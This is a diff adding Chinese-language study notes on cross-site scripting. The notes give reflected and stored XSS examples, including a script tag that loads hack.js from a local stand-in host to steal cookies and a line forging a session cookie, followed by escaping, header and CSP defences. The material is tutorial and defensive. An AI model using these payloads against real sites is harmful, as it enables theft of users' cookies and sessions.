@@ -13,7 +13,64 @@
 #### XSS
 cross site scripting
 跨站脚本攻击
+XSS(Cross-Site Scripting), 跨站脚本攻击，因为缩写和CSS重叠，所以只能叫XSS，跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。
+跨站脚本攻击有可能造成以下影响
+1. 利用虚假输入表单骗取用户个人信息。
+2. 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
+3. 显示伪造的文章或图片
 
+XSS 攻击分类
+- 反射型 - url 参数直接注入
+```
+// 普通
+http://127.0.0.1:3000?from=china
+// alert 尝试
+http://127.0.0.1:3000/?from=<script>alert(3)</script>
+// 获取cookie
+http://127.0.0.1:3000/?from=<script src="http://127.0.0.1:4000/hack.js"></script>
+// 短域名伪造 https://dwz.cn/
+通过短域名把真实的域名和参数进行覆盖
+// 防伪造cookie入侵，chrome
+document.cookie="yd:sess=eyj1csadadasdsddasdadd"
+```
+- 存储型 - 存储到DB后读取时注入
+```
+// 评论
+<script>alert(1)</script>
+// 跨站脚本注入
+我来了<script src="http://127.0.0.1:4000/hack.js"></script>
+```
+##### XSS 攻击的危害 - Scripting能干啥就能干啥
+1. 获取页面数据
+2. 获取Cookies
+3. 劫持前端逻辑
+4. 发送请求
+5. 偷取网站的任意数据
+6. 偷取用户的资料
+7. 偷取用户的秘密和登录态
+8. 欺骗用户
+
+##### 防范手段
+ejs 转译小知识
+```
+<% code %> 用于执行其中javascript代码；
+<%= code %> 会对code进行html转译；
+<%- code %>将不会进行转译
+```
+
+- HEAD
+```
+ctx.set('X-XSS-Protection', 0);
+// 可以拦截url上的注入代码，但是伪装一下就不行了，比如短域名
+```
+0： 禁止XSS 过滤
+1 启用XSS过滤(通常浏览器是默认的)。如果检测到跨站脚本攻击，浏览器将清除页面(删除不安全的部分)
+1: mode=block 启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
+1: report=(Chromium only)
+启用XSS过滤，如果检测到跨站甲苯攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规报告。
+
+- CSP
+CSP本质上就是建立白名单，开发者明确告诉浏览器
 
 
 ## 网络安全
